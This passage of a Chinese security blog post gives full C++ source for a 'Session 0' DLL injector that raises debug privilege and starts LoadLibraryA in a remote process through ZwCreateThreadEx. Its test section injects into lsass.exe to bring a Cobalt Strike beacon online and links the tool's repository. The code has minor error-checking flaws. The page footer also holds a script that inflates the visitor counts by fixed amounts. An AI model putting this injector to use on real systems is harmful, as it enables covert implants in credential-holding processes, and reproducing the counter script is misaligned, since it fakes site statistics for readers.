class="string">&quot;写入内存失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4 获取loadlibrary函数的地址</span></span><br><span class="line">	HMODULE LibHandle = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	FARPROC ProcAdd = <span class="built_in">GetProcAddress</span>(LibHandle, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!ProcAdd)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;获取LoadLibraryA失败!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5 通过调用GetProcAddress函数来获取ZwCreateThreadEx函数的地址</span></span><br><span class="line">	HMODULE hNtdllDll = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	DWORD dwStatus;</span><br><span class="line">	HANDLE hRemoteThread; </span><br><span class="line">	Fn_ZwCreateThreadEx ZwCreateThreadEx = (Fn_ZwCreateThreadEx)<span class="built_in">GetProcAddress</span>(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//6 使用获取到的ZwCreateThreadEx函数在目标进程中创建线程，运行LoadLibraryA函数，参数为DLL路径</span></span><br><span class="line">	dwStatus = <span class="built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess,</span><br><span class="line">		(LPTHREAD_START_ROUTINE)ProcAdd, paraAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ZwCreateThreadEx error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放dll</span></span><br><span class="line">	<span class="built_in">FreeLibrary</span>(hNtdllDll);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hRemoteThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;filesystem&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* Fn_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* Fn_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取进程ID的函数</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessIdByName</span><span class="params">(<span class="type">const</span> std::wstring&amp; name)</span> </span>&#123;</span><br><span class="line">	DWORD pid = <span class="number">0</span>;</span><br><span class="line">	HANDLE snap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (snap != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		PROCESSENTRY32W entry = &#123; <span class="built_in">sizeof</span>(entry) &#125;;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">Process32FirstW</span>(snap, &amp;entry)) &#123;</span><br><span class="line">			<span class="keyword">do</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (std::<span class="built_in">wstring</span>(entry.szExeFile) == name) &#123;</span><br><span class="line">					pid = entry.th32ProcessID;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">while</span> (<span class="built_in">Process32NextW</span>(snap, &amp;entry));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(snap);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//提权函数，启用调试特权</span></span><br><span class="line"><span class="comment">//这个函数的主要作用是启用当前进程的“debug programs”特权，这个特权允许进程附加到其他进程并控制它们</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	</span><br><span class="line">	HANDLE hToken; <span class="comment">// 用于保存进程访问令牌的句柄</span></span><br><span class="line">	BOOL fOk = FALSE; <span class="comment">// 用于保存函数是否执行成功的状态</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取当前进程的访问令牌</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">	&#123;</span><br><span class="line">		TOKEN_PRIVILEGES tp; <span class="comment">// 用于保存特权信息的结构体</span></span><br><span class="line">		tp.PrivilegeCount = <span class="number">1</span>; <span class="comment">// 设置特权数量为1</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 获取“Debug Programs”特权的本地唯一标识符（LUID）</span></span><br><span class="line">		<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line"></span><br><span class="line">		tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED; <span class="comment">// 设置特权的属性为启用</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 调整访问令牌，启用“Debug Programs”特权</span></span><br><span class="line">		<span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		fOk = (<span class="built_in">GetLastError</span>() == ERROR_SUCCESS); <span class="comment">// 检查是否成功启用特权</span></span><br><span class="line">		<span class="built_in">CloseHandle</span>(hToken); <span class="comment">// 关闭访问令牌的句柄</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fOk; <span class="comment">// 返回函数是否执行成功的状态</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Session0Inject</span><span class="params">(DWORD pid, <span class="type">char</span>* dllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="built_in">EnableDebugPrivilege</span>();  <span class="comment">//提权</span></span><br><span class="line">	DWORD DllNameLength = <span class="built_in">strlen</span>(dllPath);  <span class="comment">//获取dll路径名的长度</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 检查文件是否存在  注意:&lt;filesystem&gt;库需使用支持C++17或更高版本的编译器</span></span><br><span class="line">	<span class="keyword">if</span> (!std::filesystem::<span class="built_in">exists</span>(dllPath)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;指定的DLL文件不存在\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1 获取目的进程句柄</span></span><br><span class="line">	HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;打开进程失败: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2 为目的进程分配内存,用于存放Loadlibrary传入的参数,即dll的路径</span></span><br><span class="line">	VOID* paraAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, DllNameLength + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == paraAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;内存分配失败\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//3 将DLL的路径写到目标进程的内存</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, paraAddr, dllPath, DllNameLength + <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;写入内存失败！\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//4 获取loadlibrary函数的地址</span></span><br><span class="line">	HMODULE LibHandle = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	FARPROC ProcAdd = <span class="built_in">GetProcAddress</span>(LibHandle, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!ProcAdd)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;获取LoadLibraryA失败!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//5 通过调用GetProcAddress函数来获取ZwCreateThreadEx函数的地址</span></span><br><span class="line">	HMODULE hNtdllDll = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	DWORD dwStatus;</span><br><span class="line">	HANDLE hRemoteThread; </span><br><span class="line">	Fn_ZwCreateThreadEx ZwCreateThreadEx = (Fn_ZwCreateThreadEx)<span class="built_in">GetProcAddress</span>(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//6 使用获取到的ZwCreateThreadEx函数在目标进程中创建线程，运行LoadLibraryA函数，参数为DLL路径</span></span><br><span class="line">	dwStatus = <span class="built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess,</span><br><span class="line">		(LPTHREAD_START_ROUTINE)ProcAdd, paraAddr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == ZwCreateThreadEx)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ZwCreateThreadEx error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放dll</span></span><br><span class="line">	<span class="built_in">FreeLibrary</span>(hNtdllDll);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(hRemoteThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc == <span class="number">3</span>)</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="comment">//atoi函数可将字符串转化为整数</span></span><br><span class="line">		BOOL bRet = <span class="built_in">Session0Inject</span>((DWORD)<span class="built_in">atoi</span>(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">-1</span> == bRet)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Inject dll failed\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Inject dll successfully\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;你需输入两个参数,参数1为pid,参数2为dll的绝对路径\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h1><p>首先获取lsass进程的PID，此处为696</p>
+<img src="session0注入/image-20230611233900720.png" alt="image-20230611233900720" style="zoom:67%;" />	
+
+
+
+<p>以管理员权限运行cmd，使用session0注入将dll注入至lsass进程中</p>
+<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611233625460.png" alt="image-20230611233625460">			</p>
+<p>Cobalt Strike成功上线</p>
+<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611234019447.png" alt="image-20230611234019447"></p>
+<p>在火绒剑可以看到lsass进程注入的dll</p>
+<img src="session0注入/image-20230611234104530.png" alt="image-20230611234104530" style="zoom: 50%;" />	
+
+<p>​			</p>
+<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a target="_blank" rel="noopener" href="https://github.com/xf555er/Session0_Inject">https://github.com/xf555er/Session0_Inject</a></p>
+<p>​	</p>
+<p>​	</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/04/29/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/04/29/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">远程线程注入函数调用流程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-CreateRemoteThreadStub"><span class="nav-number">2.1.</span> <span class="nav-text">1.CreateRemoteThreadStub</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-CreateRemoteThread"><span class="nav-number">2.2.</span> <span class="nav-text">2.CreateRemoteThread</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-NtCreateThread"><span class="nav-number">2.3.</span> <span class="nav-text">3.NtCreateThread</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">2.4.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E7%BA%BF%E7%A8%8B%E5%92%8C%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">3.</span> <span class="nav-text">普通线程和远程线程的区别</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF"><span class="nav-number">4.</span> <span class="nav-text">代码实现思路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-ZwCreateThread%E5%87%BD%E6%95%B0%E7%9A%84%E5%A3%B0%E6%98%8E%E5%8F%8A%E5%AE%9A%E4%B9%89"><span class="nav-number">4.1.</span> <span class="nav-text">1.ZwCreateThread函数的声明及定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%8F%90%E5%8D%87%E8%BF%9B%E7%A8%8B%E6%9D%83%E9%99%90"><span class="nav-number">4.2.</span> <span class="nav-text">2.提升进程权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Session0%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0"><span class="nav-number">4.3.</span> <span class="nav-text">3.Session0注入函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81"><span class="nav-number">5.</span> <span class="nav-text">完整代码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%90%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="nav-number">6.</span> <span class="nav-text">运行测试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80"><span class="nav-number">7.</span> <span class="nav-text">项目地址</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xiao Ni"
+      src="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
+  <p class="site-author-name" itemprop="name">Xiao Ni</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xiao Ni</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+#running-time
+
+<script>
+    $(document).ready(function () {
+
+        var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+        var pvcountOffset = 80000;  // 初始化首次数据
+        var uvcountOffset = 20000;
+
+        function fixCount() {
+            if (document.getElementById("busuanzi_container_site_pv").style.display != "none") {
+                $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + pvcountOffset);
+                clearInterval(int);
+            }
+            if ($("#busuanzi_container_site_pv").css("display") != "none") {
+                $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + uvcountOffset); // 加上初始数据 
+                clearInterval(int); // 停止检测
+            }
+        }
+    });
+</script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
